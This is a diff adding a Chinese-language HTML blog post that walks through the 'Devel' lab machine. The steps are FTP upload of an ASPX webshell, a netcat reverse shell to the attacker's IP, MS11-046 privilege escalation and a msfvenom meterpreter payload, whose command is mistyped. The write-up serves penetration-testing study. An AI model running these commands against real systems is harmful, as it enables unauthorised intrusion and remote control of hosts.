@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Devel | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="nmap scannmap -p- –min-rate 10000  10.10.10.5详细扫描21,80端口发现21端口可以进行匿名登录 21 portftp 10.10.10.5该网站下存在一个htm页面和一个welcome的png 80 port80端口的默认界面是一个IIS7默认界面使用dirsearch进行目录扫描有一个aspnet_client,但是禁止访问了请求头表示这是一个ASP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Devel">
+<meta property="og:url" content="http://example.com/2022/08/28/Devel/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap scannmap -p- –min-rate 10000  10.10.10.5详细扫描21,80端口发现21端口可以进行匿名登录 21 portftp 10.10.10.5该网站下存在一个htm页面和一个welcome的png 80 port80端口的默认界面是一个IIS7默认界面使用dirsearch进行目录扫描有一个aspnet_client,但是禁止访问了请求头表示这是一个ASP">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/nmap1.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/nmap2.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/ftp1.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/dirsearch.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/request.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/ftp2.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/web1.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/web2.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/smb.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/webshell.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/systeminfo.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/windows-exploit-suggester.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/meter.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/meter2.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/meter3.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/meter4.png">
+<meta property="og:image" content="http://example.com/2022/08/28/Devel/meter5.png">
+<meta property="article:published_time" content="2022-08-29T01:43:37.000Z">
+<meta property="article:modified_time" content="2022-08-29T04:48:02.639Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/08/28/Devel/nmap1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Devel" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/28/Devel/" class="article-date">
+  <time class="dt-published" datetime="2022-08-29T01:43:37.000Z" itemprop="datePublished">2022-08-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Devel
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><p>nmap -p- –min-rate 10000  10.10.10.5<br><img src="/2022/08/28/Devel/nmap1.png"><br>详细扫描21,80端口<br><img src="/2022/08/28/Devel/nmap2.png"><br>发现21端口可以进行匿名登录</p>
+<h4 id="21-port"><a href="#21-port" class="headerlink" title="21 port"></a>21 port</h4><p>ftp 10.10.10.5<br><img src="/2022/08/28/Devel/ftp1.png"><br>该网站下存在一个htm页面和一个welcome的png</p>
+<h4 id="80-port"><a href="#80-port" class="headerlink" title="80 port"></a>80 port</h4><p>80端口的默认界面是一个IIS7默认界面<br>使用dirsearch进行目录扫描<br><img src="/2022/08/28/Devel/dirsearch.png"><br>有一个aspnet_client,但是禁止访问了<br><img src="/2022/08/28/Devel/request.png"><br>请求头表示这是一个ASP.NET</p>
+<h4 id="shell-as-a-web"><a href="#shell-as-a-web" class="headerlink" title="shell as a web"></a>shell as a web</h4><p>尝试用ftp往上面传一个shell(cmd.aspx)<br><img src="/2022/08/28/Devel/ftp2.png"><br>尝试访问这个界面<br><img src="/2022/08/28/Devel/web1.png"><br><img src="/2022/08/28/Devel/web2.png"><br>本地kali开启smbserver<br><img src="/2022/08/28/Devel/smb.png"><br>共享当前文件夹并在该文件夹里面放一个nc.exe<br>在传到网站上的webshell中执行反弹程序<br><code>\\10.10.14.2\share\nc.exe -e cmd.exe 10.10.14.2 4444</code><br>并在本地开启nc进行监听，能收到反弹的shell<br><img src="/2022/08/28/Devel/webshell.png"><br>该权限是网站权限所有的user目录都不能访问</p>
+<h4 id="shell-as-root"><a href="#shell-as-root" class="headerlink" title="shell as root"></a>shell as root</h4><img src="/2022/08/28/Devel/systeminfo.png">
+查看系统信息
+<img src="/2022/08/28/Devel/windows-exploit-suggester.png">
+发现有多个可以利用的漏洞
+一个github上面有很多已经编译过的exe利用程序
+[https://github.com/abatchy17/WindowsExploits]()
+用ms11-011失败
+用ms11-046成功
+#### shell with msf
+用msfvenom 制作一个aspx上传到服务器上
+`msfvenom -p wimdows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=8888 -f shell.aspx`
+<img src="/2022/08/28/Devel/meter.png">
+<img src="/2022/08/28/Devel/meter2.png">
+<img src="/2022/08/28/Devel/meter3.png">
+<img src="/2022/08/28/Devel/meter4.png">
+<img src="/2022/08/28/Devel/meter5.png">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/08/28/Devel/" data-id="cl7edtt450003jtcp8iiw3r03" data-title="Devel" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/08/29/Arctic/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Arctic
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/28/oscp/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">oscp</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/30/Networked/">Networked</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/29/Buff/">Buff</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/29/Arctic/">Arctic</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/28/Devel/">Devel</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/28/oscp/">oscp</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
